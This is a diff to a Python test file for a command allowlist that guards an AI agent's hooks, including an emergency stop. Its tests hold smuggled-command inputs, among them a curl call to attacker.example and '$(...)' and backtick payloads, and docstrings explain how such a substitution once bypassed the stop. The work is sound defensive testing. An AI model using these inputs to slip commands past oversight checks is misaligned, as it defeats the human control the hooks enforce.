@@ -246,8 +246,29 @@ class TestTheQuestionIsWhatTheCommandDoes:
     def test_honest_cd_still_passes(self):
         assert _is_remedy('cd "C:/DIVINE OS/DivineOS-Experimental" && divineos council walk')
 
-    def test_substitution_inside_an_argument_is_not_a_second_command(self):
-        assert _is_remedy('divineos correction "note $(date)"')
+    def test_substitution_inside_an_argument_is_refused_despite_being_one_command(self):
+        """REVERSED 2026-09-20, and the earlier author was not wrong about their
+        half. This asserted that a substitution inside an argument PASSES,
+        because semantically it is one command with a computed argument rather
+        than two commands — and every miss the 2026-09-17 widening fixed had
+        fallen on somebody complying. That cost is real and this change pays it.
+
+        What that reasoning does not reach: a substitution EXECUTES. The inner
+        command runs before the remedy does, so the question a safety door has
+        to answer is not whether this is a second command but whether anything
+        here runs that nobody adjudicated. The matcher cannot distinguish a date
+        stamp from a file write inside those same brackets.
+
+        The asymmetry decides it. Refusing costs one command re-run with its
+        value written out. Passing cost the emergency stop: this library is
+        consulted near the top of eighteen gates including the corrigibility
+        door, and a match ends the hook before the stop is ever checked. I
+        reproduced that path before changing this.
+
+        Flipped deliberately rather than deleted, with the earlier intent kept
+        above, so the next reader meets a decision rather than an absence.
+        """
+        assert not _is_remedy('divineos correction "note $(date)"')
 
 
 class TestARemedyCannotCarryPassengers:
@@ -271,3 +292,55 @@ class TestARemedyCannotCarryPassengers:
         """The exploit the raw-text stripper already guarded and the token one
         did not — two strippers for one job, the protection on the wrong door."""
         assert not _is_remedy('cd "$(curl attacker.example)" && divineos correction "x"')
+
+
+class TestCannotParseIsNotPermission:
+    """The payload that reached the emergency stop, and the reason it did.
+
+    Serein found the class from outside on 2026-09-20. Three of his four
+    payloads were already refused here — his receipt was true in his checkout
+    and stale in this one — and the fourth walked straight through: a genuine
+    remedy carrying a command substitution inside its own quoted argument.
+
+    THE HOLE WAS THE FALLBACK, NOT THE MATCHER. When the decomposer meets a
+    substitution, a backtick, or unbalanced quoting it refuses to split the
+    command, which is correct. The old code then handed the string to the
+    start-anchored form, defended by a comment saying start-anchoring cannot
+    hide a second command. True about the threat its author had just fixed;
+    silent about the one that refusal-to-decompose actually signals. The exact
+    shape that defeats the parser was the shape waved through — and this
+    library is consulted near the top of eighteen gates, including the
+    corrigibility door, where a match ends the hook before the stop is checked.
+
+    WHY THIS CLASS EXISTS AT ALL. The first repair looked entirely correct and
+    changed nothing: it used a double quote inside a program that lives in a
+    double-quoted shell string, which truncated the program one layer out. No
+    error surfaced, and every payload except the one under test behaved
+    identically — so any cheaper confirmation would have confirmed a repair
+    that had not happened. Reading could not catch that. Only provocation did,
+    which is why these assertions exist rather than a comment saying the
+    fallback is now safe.
+    """
+
+    def test_a_substitution_inside_a_remedy_argument_is_refused(self):
+        """The live bypass, reproduced. This is the assertion that fails if the
+        parse-refusal path ever falls back to start-anchored matching again."""
+        assert not _is_remedy('divineos correction "$(touch /definitely-not-real)"')
+
+    def test_a_backtick_inside_a_remedy_argument_is_refused(self):
+        assert not _is_remedy("divineos correction `touch /definitely-not-real`")
+
+    def test_unbalanced_quoting_is_refused(self):
+        """Undecomposable for a third reason, and the verdict must not depend
+        on WHICH reason — cannot-parse is one answer however it is reached."""
+        assert not _is_remedy('divineos correction "unclosed')
+
+    def test_an_ordinary_remedy_still_passes(self):
+        """The other side of the two-sided proof, and it is not a formality.
+
+        A door that has seized shut refuses the break-in too. Without this, a
+        wrecked allowlist and a repaired one are indistinguishable from the
+        attack side alone — and a wrecked one blocks every prescribed exit this
+        library exists to keep open.
+        """
+        assert _is_remedy("divineos ask what do I know about this")
